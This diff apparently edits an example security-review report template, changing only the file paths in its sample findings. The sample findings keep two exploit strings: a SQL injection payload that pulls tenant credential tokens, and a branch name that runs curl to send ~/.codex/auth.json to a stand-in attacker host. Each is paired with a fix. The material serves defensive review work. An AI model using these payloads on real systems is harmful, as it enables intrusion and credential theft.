@@ -9,10 +9,10 @@ The report is what the caller records, so its shape is fixed. Findings carry `pa
 **Phases run**: repository context, comparative analysis, vulnerability assessment
 
 ### Confirmed findings (HIGH/MEDIUM at ≥ 80)
-- `apps/mirror/src/routes/search.ts:88` — HIGH — sql_injection — 95 — the `q` query parameter is concatenated into the D1 statement.
+- `apps/api/src/routes/search.ts:88` — HIGH — sql_injection — 95 — the `q` query parameter is concatenated into the D1 statement.
   Exploit: `?q=' UNION SELECT token FROM tenant_credentials--` returns every tenant's credential rows to the caller.
   Fix: bind it — `db.prepare("... WHERE title LIKE ?").bind(`%${q}%`)` — as the sibling routes already do.
-- `apps/runner/src/executors/codex.ts:212` — MEDIUM — command_injection — 82 — the branch name reaches `sh -c` unquoted.
+- `apps/worker/src/jobs/checkout.ts:212` — MEDIUM — command_injection — 82 — the branch name reaches `sh -c` unquoted.
   Exploit: a tenant branch named `x;curl attacker/$(cat ~/.codex/auth.json)` runs in the phase container.
   Fix: pass argv to `spawn` without a shell, as `cli.ts`'s `createRealSpawn` does.
 
@@ -23,7 +23,7 @@ The report is what the caller records, so its shape is fixed. Findings carry `pa
 2 confirmed findings (1 HIGH, 1 MEDIUM); 1 informational note.
 
 ```catalyst-review-step
-{"step":"security-review","verdict":"FAIL","detail":"2 confirmed findings: apps/mirror/src/routes/search.ts:88 SQL injection via q; apps/runner/src/executors/codex.ts:212 branch name reaches sh -c unquoted","findings":[{"path":"apps/mirror/src/routes/search.ts","line":88},{"path":"apps/runner/src/executors/codex.ts","line":212}]}
+{"step":"security-review","verdict":"FAIL","detail":"2 confirmed findings: apps/api/src/routes/search.ts:88 SQL injection via q; apps/worker/src/jobs/checkout.ts:212 branch name reaches sh -c unquoted","findings":[{"path":"apps/api/src/routes/search.ts","line":88},{"path":"apps/worker/src/jobs/checkout.ts","line":212}]}
 ```
 ```
 
